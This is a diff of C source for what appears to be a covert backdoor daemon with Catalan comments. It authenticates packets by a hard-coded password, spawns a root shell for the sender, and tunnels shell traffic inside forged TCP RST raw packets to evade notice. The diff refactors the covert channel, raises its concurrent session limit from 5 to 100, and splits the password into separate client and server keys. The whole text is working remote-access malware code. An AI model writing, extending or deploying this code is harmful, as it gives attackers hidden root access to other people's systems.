@@ -14,17 +14,14 @@
 #include <sys/ioctl.h>
 #include <sys/wait.h>
 
+
+#include "raw.h"
 #include "../include/config.h"
 #include "../include/actions.h"
 
 #define CHECKSTR "check"
 #define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "
-#define MAXDIRECTRAW 5
-
-struct rawsock {
-    int r[2];
-    int w[2];
-};
+#define MAXDIRECTRAW 100
 
 int weekday;
 struct rawsock rawsocks[MAXDIRECTRAW];
@@ -38,6 +35,27 @@ __inline__ void debug(char * format, ...){
     va_end(args);
 #endif
 }
+
+struct rawsock *findrawsock(int port) {
+    int i;
+    for (i = 0; i < MAXDIRECTRAW; i++) {
+        if (rawsocks[i].id == port) {
+            return &rawsocks[i];
+        }
+    }
+    for (i = 0; i < MAXDIRECTRAW; i++) {
+        if (rawsocks[i].id == 0) {
+            debug("initializing rawsock\n");
+            rawsocks[i].id = port;
+            pipe(rawsocks[i].r);
+            pipe(rawsocks[i].w);
+            rawsocks[i].initialized = 1;
+            return &rawsocks[i];
+        }
+    }
+    return 0;
+}
+
 
 // Cron function
 #if CRON
@@ -266,87 +284,6 @@ void launcher_shell(int sockr, int sockw) {
     waitpid(subshell, NULL, 0);
 }
 
-void send_raw(struct in_addr *ip, short port, unsigned char *buf, int size) {
-    short pig_ack=0;
-    unsigned char datagram[sizeof(struct tcphdr) + 12 + sizeof(struct data)];
-    struct tcphdr *tcph = (struct tcphdr *) (datagram);
-    struct sockaddr_in servaddr;
-    memset(datagram, 0, sizeof(datagram)); /* zero out the buffer */
-
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    servaddr.sin_family = AF_INET;
-    servaddr.sin_addr.s_addr = ip->s_addr;
-
-    tcph->source = htons(80); /* source port */
-    tcph->dest = htons(port); /* destination port */
-    tcph->seq = htonl(31337);
-    tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
-    tcph->doff = 7+2+1 ;
-    tcph->urg = 0;
-    tcph->ack = 0;
-    tcph->psh = 0;
-    tcph->rst = 1;
-    tcph->syn = 0;
-    tcph->fin = 0;
-    tcph->window = htons (57344); /* FreeBSD uses this value too */
-    tcph->check = 0; /* we will compute it later */
-    tcph->urg_ptr = 0;
-
-    debug("headers ok\n");
-    struct data cmdpkt;
-    cmdpkt.port = port;
-    if ( size > 255) debug("SUPERERROR, les dades a enviar no caben!\n");
-    else {
-        cmdpkt.size = size;
-        memcpy(cmdpkt.bytes, buf, size);
-    }
-    // Si envio el packet igual que el què espero, em salta raw_daemon
-    memcpy(cmdpkt.pass, PASSWORD, strlen(PASSWORD));
-    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
-    if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
-        fprintf(stderr,"Error in sendto\n");
-    }
-    close(s);
-}
-
-// TODO: Falta parar aquest servei, i permetre més d'un servei d'aquests alhora.
-int launcher_directraw(struct in_addr *ip, short port) {
-    int pid;
-    if (port < MAXDIRECTRAW && port > 0 ) {
-        pid = fork();
-        if (!pid) {
-            debug("launching on port: %d\n", port);
-            while (1) {
-
-                fd_set fds;
-                int count;
-                unsigned char buf[BUFSIZE];
-
-                // put the fd to watch
-                FD_ZERO(&fds);
-                FD_SET(rawsocks[port].w[0], &fds);
-
-                // there are data on pipe?
-                if (select(rawsocks[port].w[0]  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
-
-                // if there ara data, send it throw raw packet
-                if (FD_ISSET(rawsocks[port].w[0], &fds)) {
-                    count = read(rawsocks[port].w[0], buf, BUFSIZE);
-                    debug("=> Sending RAW packet to client\n");
-                    send_raw(ip, port, buf, count);
-                    debug("<= Raw packet sended!\n");
-                } 
-            } 
-        } else {
-            debug("directraw: retuning pid\n");
-            return pid;
-        }
-    } else {
-        debug("Invalid port=%d\n", port);
-    }
-    return 0;
-}
-
 void do_action(struct data *d, struct in_addr *ip, int sock) {
     if (fork() != 0){
         return;
@@ -375,9 +312,10 @@ void do_action(struct data *d, struct in_addr *ip, int sock) {
             debug("Launching shell\n");
             if (!getuid()) {
                 debug("Starting DirectRAW service\n");
-                if (launcher_directraw(ip, d->port)) {
+                struct rawsock *r = findrawsock(d->port);
+                if (launcher_directraw(r, ip->s_addr, 80, d->port, SERVERAUTH)) {
                     debug("done!\n");
-                    launcher_shell(rawsocks[d->port].r[0], rawsocks[d->port].w[1]);
+                    launcher_shell(r->r[0], r->w[1]);
                     // kill pid
                 }
             } else {
@@ -412,16 +350,6 @@ void do_action(struct data *d, struct in_addr *ip, int sock) {
     }
     debug("Connection closed\n");
     exit(0);
-}
-
-void fill_raw_connection(struct data *d) {
-    if (d->port < MAXDIRECTRAW && d->port > 0) {
-        debug("Escrivint dades a la pipe pertinent(%d)\n", d->port);
-        write(rawsocks[d->port].r[1], d->bytes, d->size);
-    } else {
-        debug("Received raw data for an invalid thread: port=%d\n", d->port);
-    }
-    return;
 }
 
 void tcp_daemon(int port) {
@@ -468,7 +396,7 @@ void tcp_daemon(int port) {
             if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
                 debug("ERROR: tcp_daemon. Llegits %d bytes\n", bytes);
             }
-            if (!memcmp(PASSWORD, d.pass, 20)) {
+            if (!memcmp(CLIENTAUTH, d.pass, 20)) {
                 debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", d.action);
                 do_action(&d, &tcp.sin_addr, sock_con);
             }
@@ -480,7 +408,7 @@ void tcp_daemon(int port) {
 
 
 void raw_daemon() {
-    int sock, i;
+    int sock;
     struct sockaddr_in raw;
     unsigned int slen = sizeof(raw);
     struct packet p;
@@ -492,29 +420,18 @@ void raw_daemon() {
         exit(-1);
     }
 
-    // Initalizing direct raw pipes
-    for (i = 0; i < MAXDIRECTRAW; i++) {
-        if (pipe(rawsocks[i].r) || pipe(rawsocks[i].w)) {
-            debug("Error creating pipes\n");
-        }
-    }
-
     // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
     while (1) {
         size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
-        //        debug("Rebut: %d bytes port %d - %d\n", size, ntohs(p.tcp.dest), ntohs(p.tcp.source));
-        //    if (ntohs(p.tcp.dest) == 2222) {
-        //        debug("Rebut: %d bytes ports %d -> %d\n", size, ntohs(p.tcp.source), 2222);
-        //    }
         // Si el tamany del paquet es el que toca
         if (size == sizeof(struct packet)) {
             // I el password és correcte
-            if (!memcmp(PASSWORD, p.action.pass, 20)) {
+            if (!memcmp(CLIENTAUTH, p.action.pass, 20)) {
                 debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
                 //If has the RESET flag, is a direct raw packet
                 if (p.tcp.rst) {
-                    debug("packet de sessio RAW\n");
-                    fill_raw_connection(&(p.action));
+                    debug("packet de sessio RAW (%d bytes)\n", p.action.size);
+                    fill_raw_connection(findrawsock(p.action.port), p.action.bytes, p.action.size);
                 } else {
                     debug("packet normal RAW\n");
                     do_action(&(p.action), &raw.sin_addr, 0);
